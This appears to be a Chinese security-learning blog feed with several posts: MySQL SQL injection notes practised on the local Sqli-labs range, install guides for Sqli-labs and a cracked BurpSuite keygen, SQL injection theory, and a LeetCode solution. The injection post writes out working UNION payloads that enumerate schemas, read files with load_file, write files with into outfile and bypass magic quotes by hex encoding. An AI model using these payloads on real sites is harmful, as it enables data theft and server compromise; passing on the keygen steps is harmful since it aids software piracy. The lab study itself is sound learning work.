sec)</span><br></pre></td></tr></table></figure></li><li>打开网页进行查询当前数据库的用户</li><li><code>?id=-1%20union%20select%201,user(),3</code></li><li>可以看见当前用户为root，拥有最高权限<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907222102.png" alt="image.png"></li><li>获取到当前网页的数据库名</li><li><code>?id=-1%20union%20select%201,database(),3</code>3</li><li>获取到当前数据库名为security<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908154319.png" alt="image.png"></li><li>常见的数据库与用户的对应关系</li><li>这样的好处一个用户对应一个数据库，网站之间的数据不会互相干扰，这是最基础的数据库模型，现在大网站都是分布式数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库A=网站A=数据库用户A——&gt;表名——&gt;列名——&gt;数据</span><br><span class="line">数据库B=网站B=数据库用户B——&gt;表名——&gt;列名——&gt;数据</span><br><span class="line">数据库C=网站C=数据库用户C——&gt;表名——&gt;列名——&gt;数据</span><br></pre></td></tr></table></figure></li><li>在数据库中查询有哪些用户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="keyword">select</span> host,user,authentication_string from user;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908155809.png" alt="image.png"></li><li>在源码查看使用的是哪一个用户</li><li>一般网站安装时都会指定数据库二点用户名和密码</li><li>这里指定root用户，密码为空，指定数据库为security<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db-creds.inc</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//give your mysql connection username n password</span><br><span class="line"><span class="variable">$dbuser</span> =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> =<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> =<span class="string">&quot;security&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname1</span> = <span class="string">&quot;challenges&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li>跨库查询的前提条件是必须<strong>高权限</strong>的用户才能执行跨库查询。</li><li><code>?id=-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908160951.png" alt="image.png"></li><li>相当于数据库执行<code>select * from users where id=-1 union select 1,schema_name,3 from information_schema.schemata limit 0,1;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908164510.png" alt="image.png"></li></ul><h2 id="获取到所有的数据库名称"><a href="#获取到所有的数据库名称" class="headerlink" title="获取到所有的数据库名称"></a>获取到所有的数据库名称</h2><ul><li><code>union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata</code></li><li><code>group_concat()</code>将分组中的字符串与各种选项进行连接<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908164653.png" alt="image.png"></li><li>相当于数据库执行&#96;select * from users where id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908165412.png" alt="image.png"></li></ul><h2 id="指定获取book库中的表名信息"><a href="#指定获取book库中的表名信息" class="headerlink" title="指定获取book库中的表名信息"></a>指定获取book库中的表名信息</h2><ul><li><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908165653.png" alt="image.png"></li><li>相当于数据库执行命令<code>select * from users where id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170204.png" alt="image.png"></li></ul><h2 id="获取指定数据库book下的book表的列名信息"><a href="#获取指定数据库book下的book表的列名信息" class="headerlink" title="获取指定数据库book下的book表的列名信息"></a>获取指定数据库book下的book表的列名信息</h2><ul><li><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;book&#39; and table_schema=&#39;book&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170625.png" alt="image.png"></li><li>相当于数据库命令<code>select * from users where id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;book&#39; and table_schema=&#39;book&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908170859.png" alt="image.png"></li></ul><h2 id="查询到指定数据"><a href="#查询到指定数据" class="headerlink" title="查询到指定数据"></a>查询到指定数据</h2><ul><li>union  select book_id,book_title,book_author from book.book<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908172628.png" alt="image.png"></li><li>数据库命令<code>select * from users where id=-1 union select book_id,book_title,book_author from book.book;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908172716.png" alt="image.png"></li></ul><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ul><li>username和password字段是users表中的字段，又因为查询到的数据为空，执行后面的联合字句的时候将内容填充到下面，所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</li></ul><h1 id="文件读写函数"><a href="#文件读写函数" class="headerlink" title="文件读写函数"></a>文件读写函数</h1><ul><li><code>load_file</code>文件读取</li><li><code>into outfile</code>或<code>into dumpfile</code>文件</li><li>获取路径的常见方法：报错显示、遗漏文件、漏洞报错、平台配置文件、爆破等</li><li>报错显示：当网站出现错误的时候，在报错显示当中可能就会包含文件的路径</li><li>遗漏文件：在网站建立的时候会有<code>phpinfo.php</code>文件，通常用于建立网站时使用，当中会包含文件路径</li><li>漏洞报错：通过网站漏洞，爆路径的方式</li><li>平台配置文件：通过读取文件来读取网站的配置文件，通常是默认的路径，如果改了那就很难找到</li><li>爆破：通常是没办法的时候，通过一个一个试的方式</li><li>通过工具扫描通常就能发现很多错误，通常就会包括路径</li></ul><h2 id="查询是否有写入的权限"><a href="#查询是否有写入的权限" class="headerlink" title="查询是否有写入的权限"></a>查询是否有写入的权限</h2><ul><li><code>show global variables like &#39;%secure_file_priv%&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908220011.png" alt="image.png"></li><li>NULL：不允许导入或导出</li><li>&#x2F;tmp：只允许在 &#x2F;tmp 目录导入导出</li><li>空：不限制目录</li><li>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</li><li>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</li></ul><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ul><li>在网页源代码中可以看到被读取的文件内容</li><li>这里读取了数据库的配置信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908222348.png" alt="image.png"></li><li>数据库命令的内容<code>select load_file();</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908222558.png" alt="image.png"></li><li>读取敏感信息：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></li></ul><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><ul><li><code>?id=-1%20union%20select%201,%27zys%27,3%20into%20outfile%20%27D:/zys.txt%27--+</code></li><li>最后面的<code>--+</code>用于注释掉后面的内容<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223157.png" alt="image.png"></li><li>数据库命令<code>select &#39;zys&#39; into outfile &#39;D:/zys.txt&#39;;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223449.png" alt="image.png"></li><li>D盘当中就生成了这个文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908223505.png" alt="image.png"></li></ul><h1 id="魔法引号开关"><a href="#魔法引号开关" class="headerlink" title="魔法引号开关"></a>魔法引号开关</h1><ul><li>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<strong>对单引号、双引号、反斜线、NULL</strong>加上<strong>一个一个反斜线进行转义</strong>，这个的作用跟addslashes()的作用完全相同。</li><li>正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</li></ul><h2 id="取消原因："><a href="#取消原因：" class="headerlink" title="取消原因："></a>取消原因：</h2><ul><li>在PHP5.4.0版本之后就取消了，原因</li><li>（1）可移植性:</li><li>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。</li><li>（2）性能：</li><li>由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</li><li>（3）方便：</li><li>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。</li></ul><h2 id="开关"><a href="#开关" class="headerlink" title="开关"></a>开关</h2><ul><li>在php的配置文件<code>php.ini</code>当中，<code>magic_quotes_gpc</code>为魔法引号的开关<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230908225943.png" alt="image.png"></li></ul><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>采用hex(16进制)编码绕过</li><li>因为对路径进行编码之后，不再需要单引号了，魔术引号不会再对其生效，也就是说绕过了魔术引号的作用达到绕过。</li><li>编码软件:winhex</li></ul><h1 id="int函数"><a href="#int函数" class="headerlink" title="int函数"></a>int函数</h1><ul><li>判断输入的是否为数字</li><li>判断数字基本上没办法绕过，因为没办法在纯数字当中注入内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/sqlzhuruint.png" alt="sqlzhuruint.png"></li><li>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs安装教程</title>
      <link href="/2023/09/07/Sqli-labs%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/09/07/Sqli-labs%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Sqli-labs简介"><a href="#Sqli-labs简介" class="headerlink" title="Sqli-labs简介"></a>Sqli-labs简介</h1><ul><li>Sqli-labs 是一个印度程序员写的，用来学习 sql 注入的一个游戏教程。</li><li>Sqli-labs是一个帮你总结大部分SQL注入漏洞类型的靶场，学习SQL注入漏洞原理，复现SQL注入漏洞必备靶场环境。</li></ul><h1 id="Sqli-labs下载"><a href="#Sqli-labs下载" class="headerlink" title="Sqli-labs下载"></a>Sqli-labs下载</h1><ul><li>这里提供Github的项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li><li>如果打不开就打开代理</li></ul><h1 id="Sqli-labs安装"><a href="#Sqli-labs安装" class="headerlink" title="Sqli-labs安装"></a>Sqli-labs安装</h1><ul><li>首先，需要安装apache+mysql+php的环境，建议在Windows当中安装phpstudy进行搭建</li><li>将下载好的源码压缩包，解压到phpstudy&#x2F;WWW目录下，如果出现文件重复是否替换的提示，选择是就可以了。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143540.png" alt="image.png"></li></ul><h1 id="Sqli-labs配置"><a href="#Sqli-labs配置" class="headerlink" title="Sqli-labs配置"></a>Sqli-labs配置</h1><ul><li>在<code>WWW/sqli-labs-master/sql-connections</code>文件夹当中，找到<code>db-creds.inc</code>文件，使用notepad++打开编辑<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143811.png" alt="image.png"></li><li>在<code>user</code>和<code>pass</code>两项中填写数据库的账户和密码，默认账户和密码都是<code>root</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907143932.png" alt="image.png"></li><li>如果不知道账户密码的，在phpstudy的数据库一栏中查看<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144145.png" alt="image.png"></li><li>在浏览器输入<a href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a>就可以打开靶场了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144403.png" alt="image.png"></li><li>点击<code>Setup/reset Database for labs</code>开始自动配置，显示以下画面则是安装成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144531.png" alt="image.png"></li><li>接下来就可以开始进入关卡了</li></ul><h1 id="安装时遇到的问题"><a href="#安装时遇到的问题" class="headerlink" title="安装时遇到的问题"></a>安装时遇到的问题</h1><ul><li>这是我遇到的问题，内容翻译的意思就是有无法识别的字符<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/2fea01f4fbdf21ca933eeefa5f9a5e6.png" alt="2fea01f4fbdf21ca933eeefa5f9a5e6.png"></li><li>出现这个情况可能是字符集不适配，我们在phpstudy首页，现在mysql的配置，将字符集设置为<code>utf8</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907144911.png" alt="image.png"></li><li>如果问题仍然没有解决，可以尝试降低php的版本，建议安装5.4.45版本，在phpstudy软件管理当中下载相应版本，然后在网站栏对应的网站点击管理更换php的版本<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907145141.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Day12WEB漏洞-SQL注入之简要SQL注入</title>
      <link href="/2023/09/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904153157.png" alt="image.png"></li></ul><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="理解SQL注入"><a href="#理解SQL注入" class="headerlink" title="理解SQL注入"></a>理解SQL注入</h2><ol><li>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</li><li>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。</li></ol><h2 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h2><h3 id="产生过程"><a href="#产生过程" class="headerlink" title="产生过程"></a>产生过程</h3><ul><li>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</li></ul><h3 id="常见的sql注入产生原因"><a href="#常见的sql注入产生原因" class="headerlink" title="常见的sql注入产生原因"></a>常见的sql注入产生原因</h3><ul><li>基于此，SQL注入的产生原因通常表现在以下几方面：</li></ul><ol><li>转义字符处理不合适；</li><li>不安全的数据库配置；</li><li>不合理的查询集处理；</li><li>不当的错误处理；</li><li>多个提交处理不当。</li></ol><h4 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h4><ul><li>Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。</li></ul><h4 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h4><ul><li>数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令众所周知。</li><li>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</li></ul><h4 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h4><ul><li>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</li></ul><h4 id="不当的错误处理"><a href="#不当的错误处理" class="headerlink" title="不当的错误处理"></a>不当的错误处理</h4><ul><li>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。</li></ul><h4 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h4><ul><li><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。  </p></li><li><p>应用的开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p></li><li><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。</p></li></ul><h1 id="二、MYSQL注入"><a href="#二、MYSQL注入" class="headerlink" title="二、MYSQL注入"></a>二、MYSQL注入</h1><ul><li>mysql注入的思维导图<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904200119.png" alt="image.png"></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>信息收集主要是收集数据库里面的信息，包括操作系统、数据库名、数据库用户、数据库版本、网站路径等</li><li>数据库用户指的是数据库的管理员，包括账号密码</li><li>路径主要是指网站源码的路径，不同操作系统的路径不一样</li></ul><h2 id="数据注入"><a href="#数据注入" class="headerlink" title="数据注入"></a>数据注入</h2><ul><li>高版本的数据库使用有据查询，就是有根据地查询</li><li>低版本则是暴力查询，就是能搞就搞，搞不出来就算了的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>力扣 No.70爬楼梯</title>
      <link href="/2023/09/05/%E5%8A%9B%E6%89%A3%20No.70%E7%88%AC%E6%A5%BC%E6%A2%AF/"/>
      <url>/2023/09/05/%E5%8A%9B%E6%89%A3%20No.70%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul><li>假设你正在爬楼梯。需要 <code>n</code> 阶你才能到达楼顶。</li><li>每次你可以爬 <code>1</code> 或 <code>2</code> 个台阶。你有多少种不同的方法可以爬到楼顶呢？</li><li>使用C++</li><li><strong>示例 1：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：有两种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure></li><li><strong>示例 2：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：有三种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶</span><br><span class="line">3. 2 阶 + 1 阶</span><br></pre></td></tr></table></figure></li><li><strong>示例3：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：5</span><br><span class="line">解释：有五种方法可以爬到楼顶。</span><br><span class="line">1. 1 阶 + 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶 + 1 阶</span><br><span class="line">3. 2 阶 + 1 阶 + 1 阶</span><br><span class="line">4. 1 阶 + 1 阶 + 2 阶</span><br><span class="line">5. 2 阶 + 2 阶</span><br></pre></td></tr></table></figure></li><li>难度属于简单，题目官方的解答啰哩吧嗦的，我就按照自己的想法说说吧</li></ul><h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><ul><li>每次可以选择登一阶或者两阶</li><li>我们发现第<code>n</code>阶的登顶方法数都是在<code>n-1</code>阶基础上<code>+1</code>，以及在<code>n-2</code>阶的基础上<code>+2</code>，所以这阶的方法数就是前两阶之和</li><li>用这个方法我们知道，在0阶设为1种，在1阶是1种，在2阶则是2种（因为1+1&#x3D;2），以此类推第三阶则是3种（1+2&#x3D;3）</li><li>由此则是动态规划算法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p = <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            p = q;</span><br><span class="line">            q = r;</span><br><span class="line">            r = p + q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>时间复杂度：O(n)</li><li>空间复杂度：O(1)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 力扣题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 力扣 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite安装教程</title>
      <link href="/2023/09/04/BurpSuite%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/09/04/BurpSuite%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</li></ul><h1 id="下载BurpSuite"><a href="#下载BurpSuite" class="headerlink" title="下载BurpSuite"></a>下载BurpSuite</h1><ul><li>这里我在网上找到的资源，是百度网盘下载的，如果觉得下载太慢可以自行搜索其他资源</li><li>网盘链接：<a href="https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w">https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w</a></li><li>提取码：w5lg<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904204902.png" alt="image.png"></li><li>文件目录，不建议在中文目录下</li></ul><h1 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h1><ul><li>这个资源包提供了配套的jdk，我们可以直接使用这个jdk安装就行</li><li>如果电脑本身就有Java的也可以安装，因为原有的Java版本不一定适配</li><li>由于Java环境配置特别麻烦，所以我直接给个<a href="https://www.runoob.com/java/java-environment-setup.html">非常详细的教程</a>吧，直接跳到配置环境变量那里</li><li>配置完成在<code>cmd</code>中键入<code>java -version</code>，就可以看见以下内容，说明安装配置成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205305.png" alt="image.png"></li></ul><h1 id="安装BurpSuite"><a href="#安装BurpSuite" class="headerlink" title="安装BurpSuite"></a>安装BurpSuite</h1><ul><li>首先右键资源包内的<code>burp-loader-keygen.jar</code>，使用Java打开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205549.png" alt="image.png"></li><li>点击<code>运行薄荷.vbs</code>，弹出来一个窗口<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210557.png" alt="image.png"></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904205855.png" alt="image.png"></p><ul><li>将大窗口<code>license</code>内的内容复制到小窗口内，点击Next<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210022.png" alt="image.png"></li><li>然后点击<code>Manual activation(手动激活)</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210127.png" 